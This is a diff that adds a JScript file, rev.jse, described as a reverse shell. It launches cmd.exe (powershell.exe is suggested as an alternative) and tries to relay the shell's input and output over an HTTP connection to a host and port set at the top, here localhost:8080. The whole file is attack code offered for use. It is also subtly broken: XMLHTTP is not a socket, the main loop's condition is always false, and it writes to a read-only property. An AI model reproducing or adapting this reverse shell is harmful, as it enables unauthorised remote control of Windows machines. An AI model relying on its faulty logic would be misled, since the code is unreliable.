@@ -1,0 +1,43 @@
+// rev.jse  –  JScript reverse shell to localhost:8080
+(function() {
+    var host = "127.0.0.1";
+    var port = 8080;
+    var cmd  = "cmd.exe";               // change to "powershell.exe" 
+
+    // ----- 1. Create TCP socket -----
+    var socket = WScript.CreateObject("MSXML2.XMLHTTP");
+    socket.open("GET", "http://" + host + ":" + port + "/", false);
+    socket.setRequestHeader("Connection", "Keep-Alive");
+    socket.send();                       // triggers the connection
+
+    // ----- 2. Spawn the process -----
+    var shell = WScript.CreateObject("WScript.Shell");
+    var proc  = shell.Exec(cmd);
+
+    // ----- 3. Pipe stdin/stdout over the socket -----
+    var bufferSize = 1024;
+    var timeout    = 50;                 // ms
+
+    while (!socket.readyState === 4) {   // keep running while connected
+        // ---- read from process stdout/stderr and send to socket ----
+        while (!proc.StdOut.AtEndOfStream) {
+            var data = proc.StdOut.ReadAll();
+            if (data) socket.send(data);
+        }
+        while (!proc.StdErr.AtEndOfStream) {
+            var data = proc.StdErr.ReadAll();
+            if (data) socket.send(data);
+        }
+
+        // ---- read from socket and write to process stdin ----
+        if (socket.readyState === 4 && socket.responseText.length > 0) {
+            proc.StdIn.Write(socket.responseText);
+            socket.responseText = "";
+        }
+
+        WScript.Sleep(timeout);
+    }
+
+    // ----- cleanup -----
+    proc.Terminate();
+})();
